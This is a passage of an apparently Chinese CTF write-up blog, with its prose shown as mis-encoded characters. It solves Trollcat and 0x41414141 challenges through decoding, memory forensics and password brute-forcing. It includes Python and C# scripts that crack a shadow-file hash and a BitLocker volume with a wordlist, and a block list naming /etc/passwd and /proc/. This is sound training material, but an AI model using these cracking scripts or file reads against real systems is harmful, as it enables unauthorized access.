plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;E0IPJIyDGxq2Mx56oz12LKD%3D&amp;pass&#x3D;01001001+00110010+01001001+01100110+01001100+00110010+00111001+01100111+01001101+01001001+00111001+00110000+01101111+00110001+00111001+01010001+01001000+00110000+01000001+01101001+01001101+01010100+01001001+01101100+01110000+00110010+01110101+00110001+01001100+01110100+00111101+00111101</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>E0IPJIyDGxq2Mx56oz12LKD%3D</code> ç»è¿‡ <code>URL Decode --&gt; From Base64 --&gt; ROT13</code> çš„è·¯å¾„è§£ç åå¯å¾—åˆ° <code>TROLLCATisAmazing</code>ã€‚<code>pass</code> å‚æ•°çš„å†…å®¹å°† + æ›¿æ¢ä¸ºç©ºæ ¼åå†ç»è¿‡ <code>From Binary --&gt; From Base64(N-ZA-Mn-za-m0-9+/=)</code> çš„è·¯å¾„è§£ç åå¯ä»¥å¾—åˆ° <code>Welcome_to_CSCodershub</code>ã€‚ï¼ˆéœ€è¦æ³¨æ„è¿™ä¸€æ­¥çš„ base64 è§£ç æ˜¯æ¢è¡¨çš„è§£ç ï¼‰æ ¹æ®é¢˜ç›®æè¿°å°†ä¸¤æ®µå­—ç¬¦ä¸²ç”¨å†’å·æ‹¼æ¥å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TROLLCATisAmazing:Welcome_to_CSCodershub</span><br></pre></td></tr></table></figure><h3 id="Rich-Orphan"><a href="#Rich-Orphan" class="headerlink" title="Rich Orphan"></a>Rich Orphan</h3><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://passlib.readthedocs.io/en/stable/lib/passlib.hash.md5_crypt.html">https://passlib.readthedocs.io/en/stable/lib/passlib.hash.md5_crypt.html</a></p></blockquote><p>æ ¹æ®é™„ä»¶ç»™å‡ºçš„ hash æ ¼å¼å¯çŸ¥æ˜¯ md5_cryptã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§å‚è€ƒæ–‡æ¡£å†™ä¸ªè„šæœ¬ä½¿ç”¨ GitHub ä¸€ä¸‡å¸¸è§å¯†ç è¡¨çˆ†ç ´ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> passlib.<span class="built_in">hash</span> <span class="keyword">import</span> md5_crypt</span><br><span class="line"></span><br><span class="line">passwordFile = <span class="built_in">open</span>(<span class="string">&quot;10-million-password-list-top-10000.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">passwords = passwordFile.read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">HASH = <span class="string">&quot;$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0&quot;</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="keyword">if</span> md5_crypt.verify(password, HASH):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Found password $&#123;&#125;$&quot;</span>.<span class="built_in">format</span>(password))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Trying password $&#123;&#125;$&quot;</span>.<span class="built_in">format</span>(password))</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¯†ç æ˜¯ <code>batman</code>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;batman&#125;</span><br></pre></td></tr></table></figure><h3 id="Mr-evilpepo"><a href="#Mr-evilpepo" class="headerlink" title="Mr_evilpepo"></a>Mr_evilpepo</h3><p>volatility2 è·‘ä¸€ä¸‹ imageinfo å¾—åˆ° profileã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613572849298/6624ae56675b36d4d5b3278722838b27acdb3fb4.png"></p><p>cmdline ä¸‹å¯ä»¥å‘ç°ä¸€ä¸ªç¼–è¾‘ mysecret.txt çš„æŒ‡ä»¤ï¼Œäºæ˜¯ filescan ä¸€ä¸‹å°†å…¶åœ¨å†…å­˜ä¸­çš„ä½ç½®æ‰¾å‡ºæ¥ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613573196970/a1e82fa5d3b61ae0904a6ec389039502583113f4.png"></p><p>ä½¿ç”¨ dumpfiles å°†è¿™ä¸ªæ–‡æ¡£æå–å‡ºæ¥ï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613573387893/5f73db3e733aed7658a185b50eddb360e9a02013.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mega.nz/file/m18HSSaJ#_4Gmn4aWnrKN2716fMdSQogECaGsS5kKkDAytocSCZM</span><br></pre></td></tr></table></figure><p>å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå¾—åˆ° secret æ–‡ä»¶ã€‚æ¥ç€åœ¨é•œåƒä¸­æ‰¾çº¿ç´¢ï¼Œä½¿ç”¨ cmdscan æŸ¥çœ‹ cmd çš„æ‰§è¡Œå†å²ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ª flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613573643436/d3a1adecab2360cf81ca70743afe602b1aabbf18.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trolcat&#123;commands_4r3_important&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ pslist ä¸­è¿˜å¯ä»¥å‘ç° Chrome çš„è¿›ç¨‹ï¼Œäºæ˜¯æå– Chrome çš„å†å²è®°å½•ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613574634501/85382708a6ed17be604bc74ee6130ae1f5786320.png"></p><p>å¯ä»¥å‘ç°ä½¿ç”¨è€…è®¿é—®äº† VeraCrypt çš„ä¸‹è½½é¡µé¢å’Œä¸€ä¸ªåŠ å¯† Pastebin çš„ç½‘ç«™ã€‚åŒæ—¶å¾€ä¸Šæ‰¾å¯ä»¥å¾—åˆ°ä½¿ç”¨è€…ç²˜è´´çš„å†…å®¹çš„ç½‘å€ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://defuse.ca/b/sOOqp4UunTdD0oUjidJFlzs</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ hashdump è¯»å–ç”¨æˆ·è´¦æˆ·å¯†ç çš„ hash <code>2e6a7cf5aabb33a044684dd9c97e88a7</code>ã€‚ä½¿ç”¨åœ¨çº¿ç ´è§£å¯ä»¥å¾—åˆ°å¯†ç ä¸º abracadabraã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613575323381/9059cbee6db9d02ccdaa7acf663737193c2cff76.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613575327067/617108192f6593f49433ee3f5a52e4572eb0cf1f.png"></p><p>ä½¿ç”¨è¿™ä¸ªå¯†ç è§£å¯†åŠ å¯†çš„ Pastebin å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;secret_hidden_0nn_th3_1ntern3t&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ VeraCrypt åŠ è½½ secret æ–‡ä»¶ï¼Œä½¿ç”¨åŒä¸€ä¸ªå¯†ç æŒ‚è½½ç£ç›˜ã€‚æ‰“å¼€æŒ‚è½½çš„ç£ç›˜å¯ä»¥å¾—åˆ° foryou.txtï¼Œå…¶ä¸­åŒ…å«ç¬¬ä¸‰ä¸ª flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;y0u_got_n1ce_Skills!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="s3cr3t"><a href="#s3cr3t" class="headerlink" title="s3cr3t"></a>s3cr3t</h3><p>ä½¿ç”¨ FTK Imager æŒ‚è½½ trollcat.E01 æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613668516356/24078abed460bbe151dd06156b6983e655f5ddcc.png"></p><p>åœ¨ <code>X:\[root]\Favorites\drive</code> ä¸‹å¯ä»¥æ‰¾åˆ° topsecret.zip æ–‡ä»¶ã€‚å…¶ä¸­åŒ…å«ä¸€ä¸ªéœ€è¦è§£é” bitlocker çš„è™šæ‹Ÿç£ç›˜æ–‡ä»¶ã€‚å†™ä¸ªè„šæœ¬ä½¿ç”¨ GitHub ä¸Šçš„ä¸€ä¸‡ä¸ªå¸¸ç”¨å¯†ç çˆ†ç ´ BitLocker å¯†ç ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> ORMi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BLCSTest</span>&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">uint</span> FVE_E_FAILED_AUTHENTICATION = <span class="number">0x80310027</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> LOCKED = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> UNLOCKED = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">uint</span> FVE_E_FAILED_AUTHENTICATION = <span class="number">0x80310027</span>;</span><br><span class="line">            WMIHelper helper = <span class="keyword">new</span> WMIHelper(<span class="string">&quot;Root\\CIMV2\\Security\\MicrosoftVolumeEncryption&quot;</span>);</span><br><span class="line">            List&lt;EncryptableVolume&gt; volumes = helper.Query&lt;EncryptableVolume&gt;().ToList();</span><br><span class="line">            EncryptableVolume encryptedVolume = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            Parallel.ForEach(volumes, (volume) =&gt; &#123;</span><br><span class="line">                <span class="keyword">var</span> lockStatus = volume.GetLockStatus();</span><br><span class="line">                <span class="keyword">if</span>(lockStatus.Status == LOCKED)&#123;</span><br><span class="line">                    encryptedVolume = volume;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;[*] Found Drive &#123;0&#125;&quot;</span>,encryptedVolume.PersistentVolumeID);</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; passwords = File.ReadAllLines(<span class="string">@&quot;X:\path\to\10-million-password-list-top-10000.txt&quot;</span>,Encoding.Default).ToList();</span><br><span class="line">            <span class="built_in">bool</span> stopWatchStop = <span class="literal">false</span>;</span><br><span class="line">            TimeSpan timeSpan = TimeSpan.Zero;</span><br><span class="line">            Stopwatch stopwatch = <span class="keyword">new</span> Stopwatch();</span><br><span class="line">            stopwatch.Start();</span><br><span class="line">            Parallel.ForEach(passwords, (password) =&gt; &#123;</span><br><span class="line">                encryptedVolume.UnlockWithPassphrase(password);</span><br><span class="line">                <span class="keyword">if</span>(encryptedVolume.GetLockStatus().Status == UNLOCKED)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!stopWatchStop)&#123;</span><br><span class="line">                        stopWatchStop = <span class="literal">true</span>;</span><br><span class="line">                        stopwatch.Stop();</span><br><span class="line">                        timeSpan = stopwatch.Elapsed;</span><br><span class="line">                    &#125;</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;[*] Unlocked in &#123;0&#125;&quot;</span>,timeSpan.TotalMilliseconds);</span><br><span class="line">                    Environment.Exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">WMIClass(<span class="meta-string">&quot;Win32_EncryptableVolume&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EncryptableVolume</span> : <span class="title">WMIInstance</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DeviceID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> PersistentVolumeID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DriveLetter &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> ProtectionStatus &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> VolumeVersion <span class="title">GetVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;VolumeVersion&gt;(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">VolumeVersion</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Version&#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> LockStatus <span class="title">GetLockStatus</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;LockStatus&gt;(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LockStatus</span>&#123;</span><br><span class="line">        [<span class="meta">WMIProperty(<span class="meta-string">&quot;LockStatus&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Status&#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnlockStatus <span class="title">UnlockWithPassphrase</span>(<span class="params"><span class="built_in">string</span> passphrase</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;UnlockStatus&gt;(<span class="keyword">this</span>, <span class="keyword">new</span> &#123; Passphrase = passphrase &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UnlockStatus</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">uint</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŒ‚è½½ç£ç›˜åè¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹è¿è¡Œç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Found Drive &#123;84D081EF-90E6-49AE-9F72-35E226441E8E&#125;</span><br><span class="line">[*] Unlocked in 52768.7111</span><br></pre></td></tr></table></figure><p>è„šæœ¬åœ¨ 52768.7111ms åè§£é”äº†ç£ç›˜ã€‚ä½¿ç”¨ FTK Imager è®¿é—®æŒ‚è½½åçš„ç£ç›˜ï¼Œå¯ä»¥åœ¨å›æ”¶ç«™ä¸­æ‰¾åˆ° flag æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613674404449/a1aa264254ce518305ed87a6b3a72e10fab91775.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;finallly_y0u_f0und_mY_s3ret!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="the-sus-agent"><a href="#the-sus-agent" class="headerlink" title="the_sus_agent"></a>the_sus_agent</h3><p>Wireshark åˆ†ææµé‡åŒ…ï¼Œåœ¨ TCP æµ 0 å¤„å¯ä»¥å‘ç° welcome.jpgã€‚åœ¨ TCP æµ 88 å¤„å¯ä»¥å‘ç°åä¸º secret çš„å­—ç¬¦ä¸²ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613709979133/76a8b3e9ab2300d3ceed2b9fb74e0eaf4e18ef3a.png"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613709988121/6bc22631070cc65e84ce6ec0f2ca18be66927848.png"></p><p>å°†å¾—åˆ°çš„å­—ç¬¦ä¸² <code>aWhvcGV5b3VkaWRub3R0cmllZHRvYnJ1dGVmb3JjZWl0</code> base64 è§£ç ä¸€æ¬¡å¯å¾— <code>ihopeyoudidnottriedtobruteforceit</code>ã€‚å°†å›¾ç‰‡æå–å‡ºæ¥åä¸Šä¼ åˆ° aperisolve ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå¯†ç åˆ†æï¼Œå¯ä»¥å¾—åˆ°ä»¥ä¸‹ç»“æœã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613710082744/d3c74333af2671c37f1389ea73d226fd6aa5d832.png"></p><p>å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥è§£å‹å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;this_challenge_was_easy_right???&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF 2021</title>
      <link href="/zh-CN/posts/2bef66b8.html"/>
      <url>/zh-CN/posts/2bef66b8.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x414141"><a href="#0x414141" class="headerlink" title="0x414141"></a>0x414141</h3><p>æ ¹æ®é¢˜ç›®æè¿°å®šå‘åˆ° <a href="https://github.com/offshift-protocol/promo/commit/f2112c46cafb86e3225901b011e4ea71858901a3">GitHub Repo</a> å¯ä»¥è·å–åˆ°ä¸€ä¸ª .pyc æ–‡ä»¶ã€‚å°†å…¶ä½¿ç”¨ åç¼–è¯‘å¯å¾—å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret = <span class="string">&#x27;https://google.com&#x27;</span></span><br><span class="line">cipher2 = [<span class="string">b&#x27;NDE=&#x27;</span>, <span class="string">b&#x27;NTM=&#x27;</span>, <span class="string">b&#x27;NTM=&#x27;</span>, <span class="string">b&#x27;NDk=&#x27;</span>, <span class="string">b&#x27;NTA=&#x27;</span>, <span class="string">b&#x27;MTIz&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;MzI=&#x27;</span>, <span class="string">b&#x27;NTE=&#x27;</span>, <span class="string">b&#x27;MzQ=&#x27;</span>, <span class="string">b&#x27;NDE=&#x27;</span>, <span class="string">b&#x27;NDA=&#x27;</span>, <span class="string">b&#x27;NTU=&#x27;</span>, <span class="string">b&#x27;MzY=&#x27;</span>, <span class="string">b&#x27;MTEx&#x27;</span>, <span class="string">b&#x27;NDA=&#x27;</span>, <span class="string">b&#x27;NTA=&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;NDY=&#x27;</span>, </span><br><span class="line"><span class="string">b&#x27;MTI=&#x27;</span>, <span class="string">b&#x27;NDU=&#x27;</span>, <span class="string">b&#x27;MTE2&#x27;</span>, <span class="string">b&#x27;MTIw&#x27;</span>]</span><br><span class="line">cipher1 = [base64.b64encode(<span class="built_in">str</span>(<span class="built_in">ord</span>(i) ^ <span class="number">65</span>).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> secret]</span><br></pre></td></tr></table></figure><p>å°† cipher2 æŒ‰ç…§ç›¸åŒçš„æ–¹æ³•è§£å¯†å‡ºæ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text2 = [<span class="built_in">chr</span>(<span class="built_in">int</span>(base64.b64decode(i).decode()) ^ <span class="number">65</span>) <span class="keyword">for</span> i <span class="keyword">in</span> cipher2]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(text2))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€ä¸ªç½‘å€ <a href="https://archive.is/oMl59%E3%80%82%E5%AE%9A%E5%90%91%E5%88%B0%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF%E3%80%82">https://archive.is/oMl59ã€‚å®šå‘åˆ°è¿™ä¸ªç½‘å€å¯ä»¥å‘ç°å¦‚ä¸‹ä¿¡æ¯ã€‚</a></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613549609737/70744b59b4d0ce46aaf1de4184590ef4a188b7ff.png"></p><p>ä¸‹è½½æ–‡ä»¶å¾—åˆ° smashing.pdfï¼Œä½¿ç”¨ 010 editor æ‰“å¼€æ–‡ä»¶åå¯ä»¥å‘ç°å¾ˆå¤š 0x41 çš„å­—èŠ‚ï¼ŒçŒœæµ‹æ˜¯æ–‡ä»¶è¢«æŒ‰ä½å¼‚æˆ–è¿‡ã€‚å°è¯•å°†å…¶å¤åŸå¯ä»¥å¾—åˆ°åŸæœ¬çš„ pdf æ–‡ä»¶ã€‚binwalk ä¸€ä¸‹ pdf æ–‡ä»¶å¯ä»¥å‘ç°å…¶ä¸­åŒ…å«ä¸€ä¸ªå«æœ‰ flag.txt çš„å‹ç¼©æ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550142916/8d7f8612e81a995ade9caca0d9cca92fcbdcfdbe.png"></p><p><code>binwalk -e</code> å°†å‹ç¼©åŒ…åˆ†ç¦»å‡ºæ¥åå‘ç°è§£å‹éœ€è¦å¯†ç ï¼Œå› ä¸ºæ²¡æœ‰å‘ç°å…¶ä»–ä¿¡æ¯ï¼Œæ•…å°è¯•ä¸€æ³¢çˆ†ç ´ã€‚ä½¿ç”¨ GitHub ä¸Šçš„ä¸€ä¸‡å¸¸ç”¨å¯†ç å¯†ç è¡¨å¯ä»¥çˆ†ç ´å¾—å‡ºå‹ç¼©åŒ…å¯†ç ä¸º passwdã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550305651/fc3dad003b1d9d6bb7cb30e39c6443c2e1f07302.png"></p><p>è§£å‹å‹ç¼©åŒ…å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1t_b33n_A_l0ng_w@y8742&#125;</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨-CyberChef-åˆ†ç¦»æ–‡ä»¶"><a href="#ä½¿ç”¨-CyberChef-åˆ†ç¦»æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨ CyberChef åˆ†ç¦»æ–‡ä»¶"></a>ä½¿ç”¨ CyberChef åˆ†ç¦»æ–‡ä»¶</h4><p>çœ‹äº†å¤§ä½¬çš„ WriteUp å‘ç°ä½¿ç”¨ CyberChef çš„ Extract Files åŠŸèƒ½ä¹Ÿå¯ä»¥åˆ†ç¦»å‡ºæ–‡ä»¶ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550427938/10d6cd23c8abf181c12e08028f40bc9a57427e56.png"></p><h3 id="file-reader"><a href="#file-reader" class="headerlink" title="file_reader"></a>file_reader</h3><p>é™„ä»¶ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line">blocked = [<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;/proc/&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blocked:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> file_path:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;you aren&#x27;t 